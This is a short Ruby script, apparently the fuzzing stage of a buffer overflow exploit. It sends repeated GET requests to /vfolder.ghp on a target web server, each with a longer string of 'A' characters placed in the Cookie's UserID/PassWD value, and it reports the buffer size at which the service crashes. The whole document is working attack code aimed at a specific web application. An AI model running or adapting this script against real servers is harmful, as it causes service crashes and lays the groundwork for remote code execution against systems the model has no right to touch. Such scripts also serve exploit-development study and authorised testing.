require 'socket'

host   = ARGV[0] || "127.0.0.1"
port   = ARGV[1] || 80
fuzz   = 40 
buffer = "A"
def send_post(host, port, buffer)
  puts "[*] Sending GET request with #{buffer.size} bytes"
  begin
    request = "GET /vfolder.ghp HTTP/1.1\r\n"
    # request += "Host: " + host + "\r\n"
    request += "Cookie: SESSIONID=9999; UserID=PassWD=" + buffer + "; frmUserName=; frmUserPass=;\r\n"
    request += "Connection: keep-alive\r\n\r\n"
    
    s = TCPSocket.open(host, port)
    s.send(request, 0)
    # s.recv(1024)  
    s.close
  rescue Errno::ECONNREFUSED
    puts "[!] The targeted Service is not running or crashed."
    exit!
  rescue Errno::ECONNRESET 
    puts "[+] Service crashes at #{buffer.size}-bytes"
    exit!
  end
end
fuzz.times {|n| send_post(host, port, (buffer += buffer * n)) ; sleep 0.2}
